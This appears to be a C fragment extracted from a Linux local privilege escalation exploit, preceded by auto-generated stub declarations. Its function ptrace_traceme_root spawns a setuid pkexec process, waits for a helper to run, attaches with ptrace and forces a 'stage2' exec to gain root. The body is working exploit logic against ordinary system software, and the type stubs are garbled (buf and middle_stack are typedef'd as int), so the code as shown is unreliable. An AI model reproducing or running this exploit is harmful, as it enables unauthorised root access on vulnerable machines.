
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef void* pid_t ;
typedef int middle_stack ;
typedef int buf ;


 int CLONE_VFORK ;
 int CLONE_VM ;
 int EXIT_SUCCESS ;
 int F_SETPIPE_SZ ;
 int O_CLOEXEC ;
 int O_DIRECT ;
 int O_RDONLY ;
 int PTRACE_ATTACH ;
 void* SAFE (int ) ;
 int SIGCHLD ;
 int basename (int ) ;
 int * block_pipe ;
 int clone (int ,char*,int,int *) ;
 int dprintf (char*,...) ;
 int dummy_status ;
 int exit (int ) ;
 int fcntl (int ,int ,int) ;
 int force_exec_and_wait (void*,int ,char*) ;
 int helper_path ;
 int middle_main ;
 int middle_success ;
 int open (int ,int ) ;
 int pipe2 (int *,int) ;
 int pkexec_path ;
 int ptrace (int ,void*,int ,int *) ;
 int read (int,char*,int) ;
 char* strchrnul (char*,char) ;
 scalar_t__ strncmp (char*,int ,int) ;
 int tprintf (char*,void*) ;
 int usleep (int) ;
 int waitpid (void*,int *,int ) ;
 int write (int ,char*,int) ;

int ptrace_traceme_root() {
  dprintf("[.] Using helper: %s\n", helper_path);





  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
  char dummy = 0;
  SAFE(write(block_pipe[1], &dummy, 1));


  dprintf("[.] Spawning suid process (%s) ...\n", pkexec_path);
  static char middle_stack[1024*1024];
  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
                            CLONE_VM|CLONE_VFORK|SIGCHLD, ((void*)0)));
  if (!middle_success) return 1;





  while (1) {
    int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
    char buf[16];
    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    buf[buflen] = '\0';
    *strchrnul(buf, '\n') = '\0';
    if (strncmp(buf, basename(helper_path), 15) == 0)
      break;
    usleep(100000);
  }





  dprintf("[.] Tracing midpid ...\n");
  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, ((void*)0)));
  SAFE(waitpid(midpid, &dummy_status, 0));
  dprintf("[~] Attached to midpid\n");

  force_exec_and_wait(midpid, 0, "stage2");
  exit(EXIT_SUCCESS);
}
